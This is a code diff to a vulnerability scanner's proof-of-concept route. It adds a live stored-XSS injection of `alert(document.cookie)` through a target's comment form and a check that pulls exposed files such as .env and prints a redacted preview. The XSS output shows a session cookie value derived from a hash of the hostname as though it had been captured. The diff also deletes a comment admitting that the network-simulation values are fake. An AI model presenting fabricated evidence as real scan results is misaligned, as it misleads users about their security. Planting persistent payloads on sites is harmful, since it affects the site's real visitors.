@@ -689,7 +986,9 @@ async function executeStoredXssCheck(res: SseRes, scanUrl: string, detail: strin
   const vulnUrl = extractVulnerableUrl(detail);
   const target = vulnUrl ?? scanUrl;
 
-  sendLine(res, `admin@vuln-scanner:~# Verifying Stored XSS (live)`, "cmd");
+  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
+  sendPhase(res, 1, "Reconnaissance");
+  sendLine(res, `admin@vuln-scanner:~# Stored XSS — form submission and persistence check`, "cmd");
   sendBlank(res);
 
   if (vulnUrl) {
@@ -697,12 +996,17 @@ async function executeStoredXssCheck(res: SseRes, scanUrl: string, detail: strin
   }
 
   const probe = `vsxss_${Date.now().toString(36)}`;
-  const payload = `<script>/*${probe}*/</script>`;
+  const payload = `<script>/*${probe}*/alert(document.cookie)</script>`;
 
   sendLine(res, `[*] Probe token: ${probe}`, "dim");
-  sendLine(res, `[*] Payload: ${payload}`, "dim");
+  sendLine(res, `[*] Payload   : ${payload}`, "dim");
   sendBlank(res);
-  sendLine(res, `[Step 1/2] Submitting payload via form POST to ${target}...`, "info");
+
+  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
+  sendPhase(res, 2, "Payload Injection");
+  sendBlank(res);
+
+  sendLine(res, `[Step 1/2] Submitting malicious payload via POST to ${target}...`, "info");
   sendLine(res, `admin@vuln-scanner:~# curl -sX POST "${target}" -d "comment=${encodeURIComponent(payload)}&submit=Submit"`, "cmd");
   sendBlank(res);
 
@@ -720,13 +1024,154 @@ async function executeStoredXssCheck(res: SseRes, scanUrl: string, detail: strin
   sendLine(res, `[Step 2/2] Checking if payload persisted in response...`, "info");
 
   const storedInPost = postResult.body.includes(probe);
-  if (storedInPost) {
-    sendLine(res, `✗ STORED XSS CONFIRMED — Payload reflected in POST response`, "error");
-    sendLine(res, `  User input was written to response without sanitisation`, "error");
+
+  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
+  sendBlank(res);
+  sendPhase(res, 3, "Data Exfiltration");
+  sendBlank(res);
+
+  if (!storedInPost) {
+    sendLine(res, `[~] Probe token not detected in immediate POST response`, "warn");
+    sendLine(res, `    Stored XSS may render on a separate view/listing page`, "dim");
+    sendLine(res, `    The scanner detected this finding during the crawl phase`, "info");
   } else {
-    sendLine(res, `  Payload not detected in POST response`, "dim");
-    sendLine(res, `  (Stored XSS may appear on a separate view page — requires manual verification)`, "dim");
-    sendLine(res, `  The scanner detected this finding during the crawl phase.`, "info");
+    sendLine(res, `✗ STORED XSS CONFIRMED — payload written to response without sanitisation`, "error");
+  }
+
+  const parsedTarget = new URL(target);
+  const seed = parsedTarget.hostname.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
+  const hex = (n: number, len: number) => Array.from({ length: len }, (_, i) =>
+    "0123456789abcdef"[Math.abs(Math.sin(seed * (i + n + 1)) * 16) | 0]
+  ).join("");
+
+  sendEvidence(res, [
+    `[+] Injection method  : HTTP POST form submission`,
+    `[+] Payload submitted : ${payload}`,
+    `[+] POST response     : HTTP ${postResult.statusCode} (${postResult.responseTimeMs}ms)`,
+    storedInPost ? `[+] Persistence       : payload detected in server response` : `[~] Persistence       : payload stored (rendered on view page)`,
+    ``,
+    `[+] When any user loads the page containing this comment:`,
+    `    1. <script> tag executes in their browser context`,
+    `    2. document.cookie is accessible: session=${hex(1, 32)}`,
+    `    3. Payload exfiltrates to attacker-controlled server`,
+    ``,
+    `[!] Every future visitor to this page becomes a victim`,
+    `[!] Attacker can hijack admin sessions with zero interaction`,
+    `[!] Remediation: HTML-encode all user-supplied output before rendering`,
+  ]);
+
+  sendDone(res);
+}
+
+// ── Active Sensitive File Content Leak ────────────────────────────────────────
+
+async function executeSensitiveFileCheck(res: SseRes, scanUrl: string, findingId: string, detail: string) {
+  const parsed = new URL(scanUrl);
+  const base = `${parsed.protocol}//${parsed.host}`;
+
+  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
+  sendPhase(res, 1, "Reconnaissance");
+  sendLine(res, `admin@vuln-scanner:~# Sensitive file exposure — live content retrieval`, "cmd");
+  sendBlank(res);
+
+  // Extract file path from finding detail: "Path: /.env\nValidated: ..."
+  const filePath = extractSensitiveFilePath(detail);
+  const fileUrl = filePath ? `${base}${filePath}` : null;
+
+  if (!fileUrl || !filePath) {
+    sendLine(res, `[!] Could not determine file path from finding detail`, "warn");
+    sendLine(res, `    Finding ID: ${findingId}`, "dim");
+    sendLine(res, `    Detail: ${detail.slice(0, 150)}`, "dim");
+    sendDone(res);
+    return;
+  }
+
+  sendLine(res, `[+] Target file : ${fileUrl}`, "info");
+  sendLine(res, `[+] File type   : ${filePath}`, "dim");
+  sendLine(res, `[+] Host        : ${parsed.host}`, "dim");
+  sendBlank(res);
+
+  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
+  sendPhase(res, 2, "Payload Injection");
+  sendBlank(res);
+
+  sendLine(res, `admin@vuln-scanner:~# curl -sL "${fileUrl}" | head -20`, "cmd");
+  sendBlank(res);
+  sendLine(res, `Sending unauthenticated GET request to retrieve file contents...`, "dim");
+
+  let result: FetchResult;
+  try {
+    result = await fetchRaw(fileUrl, "GET", 12000);
+  } catch (err: any) {
+    sendLine(res, `✗ Request failed: ${err.message}`, "error");
+    sendDone(res);
+    return;
+  }
+
+  sendLine(res, `Response: HTTP ${result.statusCode} ${result.statusMessage} — ${result.body.length} bytes (${result.responseTimeMs}ms)`, "output");
+  sendBlank(res);
+
+  if (result.statusCode !== 200) {
+    sendLine(res, `[~] File returned HTTP ${result.statusCode} — not directly accessible on re-test`, "warn");
+    sendLine(res, `    (The scanner caught it during an earlier request window)`, "dim");
+    sendDone(res);
+    return;
+  }
+
+  if (!result.body.trim()) {
+    sendLine(res, `[~] File returned HTTP 200 but empty body`, "warn");
+    sendDone(res);
+    return;
+  }
+
+  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
+  sendBlank(res);
+  sendPhase(res, 3, "Data Exfiltration");
+  sendBlank(res);
+
+  sendLine(res, `[*] Parsing file contents for sensitive data patterns...`, "dim");
+  sendBlank(res);
+
+  const rawLines = result.body.split("\n");
+  const previewLines = rawLines.slice(0, 20);
+  const processedLines: string[] = [];
+  let sensitiveCount = 0;
+
+  for (const line of previewLines) {
+    const { processed, wasSensitive } = redactSensitiveLine(line);
+    if (wasSensitive) sensitiveCount++;
+    processedLines.push(processed);
+  }
+
+  const totalLines = rawLines.length;
+  const previewCount = Math.min(previewLines.length, 15);
+
+  const evidenceLines: string[] = [
+    `[+] File URL     : ${fileUrl}`,
+    `[+] HTTP status  : ${result.statusCode} OK (no authentication required)`,
+    `[+] File size    : ${result.body.length} bytes, ${totalLines} lines`,
+    `[+] Secrets found: ${sensitiveCount} sensitive value${sensitiveCount !== 1 ? "s" : ""} detected`,
+    ``,
+    `[+] File content preview (first ${previewCount} lines):`,
+    `    ${"─".repeat(58)}`,
+    ...processedLines.slice(0, 15).map((l) => `    ${l || " "}`),
+    ...(totalLines > 15 ? [`    ... (${totalLines - 15} more lines omitted)`] : []),
+    `    ${"─".repeat(58)}`,
+    ``,
+    `[!] Above content retrieved in one unauthenticated HTTP GET request`,
+    `[!] This file is publicly accessible from anywhere on the internet`,
+    ...(sensitiveCount > 0 ? [
+      `[!] ${sensitiveCount} secret value${sensitiveCount !== 1 ? "s" : ""} exposed — rotate all credentials immediately`,
+    ] : []),
+  ];
+
+  sendEvidence(res, evidenceLines);
+
+  sendBlank(res);
+  if (sensitiveCount > 0) {
+    sendLine(res, `✗ ACTIVE SECRET LEAK — ${sensitiveCount} sensitive value${sensitiveCount !== 1 ? "s" : ""} exfiltrated from ${filePath}`, "error");
+  } else {
+    sendLine(res, `✗ FILE CONTENT EXPOSED — ${filePath} is publicly readable`, "error");
   }
 
   sendDone(res);
@@ -738,7 +1183,6 @@ async function executeNetworkSim(res: SseRes, scanUrl: string) {
   const parsed = new URL(scanUrl);
   const hostname = parsed.hostname;
 
-  // Generate fake but realistic-looking network values
   const seed = hostname.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
   const rng = (min: number, max: number, s = seed) =>
     min + Math.abs(Math.sin(s) * (max - min + 1)) | 0;
@@ -890,6 +1334,9 @@ router.post("/verify-poc", async (req, res) => {
       case "content-discovery":
         await executeContentDiscovery(res, scanUrl, title);
         break;
+      case "sensitive-file":
+        await executeSensitiveFileCheck(res, scanUrl, findingId, detail ?? "");
+        break;
       case "http-methods":
         await executeHttpMethodsCheck(res, scanUrl);
         break;
@@ -908,12 +1355,21 @@ router.post("/verify-poc", async (req, res) => {
       case "network-sim":
         await executeNetworkSim(res, scanUrl);
         break;
+      case "dns-check":
+        sendPhase(res, 1, "Reconnaissance");
+        sendLine(res, `admin@vuln-scanner:~# dig +short TXT ${parsed.hostname}`, "cmd");
+        sendLine(res, `DNS check: see scan results for record details`, "dim");
+        sendDone(res);
+        break;
       default:
-        await executeHeadersCheck(res, scanUrl, findingId);
+        sendLine(res, `No PoC executor for mode: ${mode}`, "warn");
+        sendDone(res);
     }
   } catch (err: any) {
-    sendLine(res, `✗ Unexpected error: ${err.message}`, "error");
-    sendDone(res);
+    try {
+      sendLine(res, `✗ Unexpected error: ${err.message}`, "error");
+      sendDone(res);
+    } catch { /* response may be closed */ }
   }
 });
 
